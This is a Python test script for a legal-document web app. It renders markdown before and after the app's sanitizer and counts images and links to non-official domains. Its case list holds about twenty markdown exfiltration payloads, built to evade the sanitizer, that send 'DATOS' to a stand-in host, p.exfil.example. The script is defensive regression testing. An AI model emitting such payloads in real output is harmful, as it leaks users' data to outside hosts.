"""¿Pinta la web alguna imagen o algún enlace no oficial después del saneado (RNF-20)?

Pinta cada caso antes y después de ``sanear`` con el visor real de la web (marked +
DOMPurify, el ``renderMarkdown`` de ``legaldev-web/src/lib/markdown.ts``) y cuenta las
imágenes y los enlaces a destinos que no son los dominios oficiales del corpus. Los casos son
las cargas de PP-18 (``cargas.json``) y las formas que encontró la revisión del saneado del
12/11/2026 (corchetes y paréntesis anidados, definiciones de referencia en listas, URL detrás
de cualquier carácter, vallas falsas, CRLF y acentos graves sueltos). Completa a PP-18, cuyo
oráculo (``tests/_pp18.py``) es una aproximación en Python a lo que hace un visor.

Solo lee: no carga la configuración ni el ``.env`` ni el índice, y de ``legaldev-web`` solo
usa sus ``node_modules`` (hace falta haber ejecutado ``npm ci`` allí). Necesita Node. Uso,
desde la raíz del repositorio:

    uv run python docs/mcp/pp18/visor_web.py <ruta de legaldev-web>

Sale con 1 si algún caso saneado pinta una imagen o un enlace no oficial.
"""

from __future__ import annotations

import json
import subprocess
import sys
from pathlib import Path

RAIZ = Path(__file__).resolve().parents[3]
sys.path.insert(0, str(RAIZ))

from app.sanitize import destino_oficial, sanear  # noqa: E402
from tests._pp18 import cargas  # noqa: E402

BS = "\\"
URL = "https://p.exfil.example/?d=DATOS"
CASOS_REVISION = [
    "![a [b [c]] d](//p.exfil.example/p.png?d=DATOS)",
    "[el art. [5 [RGPD]]](//p.exfil.example/?d=DATOS)",
    "[art. 5](//p.exfil.example/(a(b))?d=DATOS)",
    "[a [b [c]]](//p.exfil.example/x)(//p.exfil.example/y)(https://www.boe.es/z)",
    '[a [b [c]]](<//p.exfil.example/con espacio> "t")',
    "[a](" + BS + "/" + BS + "/p.exfil.example/x) y [b](&#47;&#47;p.exfil.example/x)",
    "- [r]: //p.exfil.example/?d=DATOS\n\nVer [art. 5][r]",
    "[a" + BS + "]b]: //p.exfil.example/?d=DATOS\n\nVer [art. 5][a" + BS + "]b]",
    "1.  uno\n\n    [r]: //p.exfil.example/?d=DATOS\n\nVer [art. 5][r]",
    "[r\nx]: //p.exfil.example/?d=DATOS\n\nVer [art. 5][r x]",
    "* > 1) [r]: <//p.exfil.example/?d=DATOS>\n\nVer [art. 5][r]",
    "[r]: " + BS + "/" + BS + "/p.exfil.example/x\n\n[a][r]",
    f"Ver _{URL}_ y _www.p.exfil.example/?d=DATOS_",
    f"Ver x{URL} 1{URL} ñ{URL} /{URL} @{URL} ftp://www.p.exfil.example/x",
    f"```x`y\n{URL}",
    f"Texto.\r\n\r\n```\r\ncodigo\r\n```\r\nVisita {URL}\r\n",
    f"Ver `x {URL} y",
    f"Ver `{URL} y",
    f"Ver `x <{URL}> y",
]


def _pintar(web: Path, textos: list[str]) -> list[dict]:
    r = subprocess.run(
        ["node", str(Path(__file__).with_name("visor_web.mjs")), str(web)],
        input=json.dumps(textos),
        capture_output=True,
        text=True,
        encoding="utf-8",
        check=True,
    )
    return json.loads(r.stdout)


def _peligros(pintado: dict) -> int:
    no_oficiales = [h for h in pintado["links"] if h and not destino_oficial(h)]
    return len(pintado["imgs"]) + len(no_oficiales)


def main() -> None:
    web = Path(sys.argv[1] if len(sys.argv) > 1 else "../legaldev-web").resolve()
    casos = [c["texto"] for c in cargas()] + CASOS_REVISION
    saneados = [sanear(t)[0] for t in casos]
    antes, despues = _pintar(web, casos), _pintar(web, saneados)
    peligrosos_antes = sum(1 for p in antes if _peligros(p))
    fallos = [t for t, p in zip(casos, despues, strict=True) if _peligros(p)]
    print(f"Visor: marked + DOMPurify de {web}")
    print(
        f"Casos: {len(casos)} ({len(cargas())} cargas de PP-18 y {len(CASOS_REVISION)} de la revisión)"
    )
    print(f"Con imagen o enlace no oficial sin sanear: {peligrosos_antes}")
    print(f"Con imagen o enlace no oficial después del saneado: {len(fallos)}")
    for t in fallos:
        print(f"  {t[:80]!r}")
    sys.exit(1 if fallos else 0)


if __name__ == "__main__":
    main()
